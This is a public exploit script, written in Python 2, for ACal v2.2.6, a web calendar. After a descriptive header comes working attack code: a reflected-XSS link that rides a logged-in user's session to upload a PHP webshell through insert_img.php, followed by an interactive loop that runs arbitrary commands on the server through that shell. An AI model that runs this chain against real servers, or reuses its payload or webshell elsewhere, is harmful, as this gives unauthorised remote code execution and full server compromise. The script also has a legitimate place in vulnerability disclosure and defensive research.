# Exploit Title: ACal v2.2.6 - 1-Click Remote Code Execution
# Exploit Author: Bobby Cooke
# Date: May 14th, 2020
# Vendor Homepage: http://acalproj.sourceforge.net/ 
# Software Link: http://prdownloads.sourceforge.net/acalproj/ACal-2.2.6.tar.gz?download
# Version: 2.2.6
# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 7.4.4 (the Hosting Webserver)
# Tested Against: Windows 10 1909 IE & Edge Browser (Client) & Linux Firefox 68.2.0esr 
# Exploit Tested On: Python 2.7.17
# Vulnerability Description: 
#   ACal v2.2.6 suffers from multiple Vulnerabilities allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via an Authenticated User clicking a Maliciously Crafted URL Link; launching a Sophisticated Attack-Chain to fully compromise the server.
# Exploit Details:
#   1. When an Authenticated User clicks the maliciously crafted URL Link, the '/calendar.php' webpage is exploited using a Reflected Cross-Site Scripting (XSS) attack in the vulnerable 'year' parameter with a GET request. 
#   2. The XSS script executes javascript code within the clients browser and "Rides" the authenticated session to perform a Cross-Site Request Forgery (CSRF) attack on the vulnerable 'insert_img.php' webpage.
#   3. Using an XMLHttpRequest, the javascript code dynamically generates & uploads a malicious PHP file to the webserver with a malicious POST request.
#   4. After the malicious PHP webshell has been uploaded to the webserver, the Exploit connects to the webserver as an Unauthenticated User.
#   5. Once connected, the Exploit communicates with the PHP Webshell on the webserver using the GET paramter 'cmd' to gain interactive Remote Code Execution (RCE) on the webserver.

import requests, sys, urllib
from colorama import Fore, Back, Style

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def urlEncode(javascript):
    return urllib.quote(javascript)

def webshell(WEBAPP_URL):
    try:
        WEB_SHELL = WEBAPP_URL+'uploads/webshell.php'
        getdir  = {'cmd': 'echo %CD%'}
        r1 = requests.get(WEB_SHELL, params=getdir, verify=False)
        status = r1.status_code
        if status != 200:
            print Style.BRIGHT+Fore.RED+"[!] "+Fore.RESET+"Could not connect to the webshell. Have an Authenticated User visit the generated URL in their Browser and Relaunch."+Style.RESET_ALL
            r1.raise_for_status()
        print(Fore.GREEN+'[+] '+Fore.RESET+'Successfully connected to webshell.')
        cwd = r1.text
        cwd = cwd.replace('\n','> ')
        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
        while True:
            cmd = raw_input(term)
            command = {'cmd': cmd}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print("\r\nExiting.")
        sys.exit(-1)

def genXhrPayload(WEBAPP_URL):
    XHR_PAYLOAD  = '<script>'
    XHR_PAYLOAD += 'function read_body(xhr) { '
    XHR_PAYLOAD += 'var data; '
    XHR_PAYLOAD += 'if (!xhr.responseType || xhr.responseType === "text") { '
    XHR_PAYLOAD += 'data = xhr.responseText; '
    XHR_PAYLOAD += '} else if (xhr.responseType === "document") { '
    XHR_PAYLOAD += 'data = xhr.responseXML; '
    XHR_PAYLOAD += '} else if (xhr.responseType === "json") { '
    XHR_PAYLOAD += 'data = xhr.responseJSON; '
    XHR_PAYLOAD += '} else { '
    XHR_PAYLOAD += 'data = xhr.response; '
    XHR_PAYLOAD += '}; '
    XHR_PAYLOAD += 'return data; '
    XHR_PAYLOAD += '}; '
    XHR_PAYLOAD += 'var xhr = new XMLHttpRequest(); '
    XHR_PAYLOAD += 'xhr.onreadystatechange = function() { '
    XHR_PAYLOAD += 'if (xhr.readyState == XMLHttpRequest.DONE) { '
    XHR_PAYLOAD += 'console.log(read_body(xhr)); '
    XHR_PAYLOAD += '}; '
    XHR_PAYLOAD += '}; '
    XHR_PAYLOAD += 'var fd = new FormData(); '
    XHR_PAYLOAD += "var content = '<?php echo shell_exec($_GET[\"cmd\"]); ?>'; "
    XHR_PAYLOAD += 'var blob = new Blob([content], { type: "application/x-php"}); '
    XHR_PAYLOAD += 'fd.append("userfile", blob, "webshell.php"); '
    XHR_PAYLOAD += 'fd.append("url", "http://"); '
    XHR_PAYLOAD += 'console.log(fd); '
    XHR_PAYLOAD += "xhr.open('POST', '"+WEBAPP_URL+"insert_img.php?upload=file', true); "
    XHR_PAYLOAD += 'xhr.send(fd); '
    XHR_PAYLOAD += '</script>'
    return XHR_PAYLOAD

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print "(+) Usage:   %s <WEBAPP_URL>" % sys.argv[0]
        print "(+) Example: %s 'https://10.0.0.3:443/calendar/'" % sys.argv[0]
        sys.exit(-1)
    WEBAPP_URL = sys.argv[1]
    CSRF_ATTACK = genXhrPayload(WEBAPP_URL)
    ENCODED_PAYLOAD = urlEncode(CSRF_ATTACK)
    print(Style.BRIGHT+Fore.BLUE+'[+] '+Fore.RESET+'To execute the '+Fore.RED+'Reflected XSS Session-Riding CSRF Attack'+Fore.RESET+', have an '+Fore.GREEN+'Authenticated User '+Fore.RESET+'visit '+Fore.CYAN+'this URL'+Fore.RESET+' in their '+Fore.BLUE+'Browser'+Fore.RESET+':')
    print Fore.CYAN+WEBAPP_URL+'calendar.php?year='+ENCODED_PAYLOAD+'&month=05#'+Fore.RESET
    webshell(WEBAPP_URL)
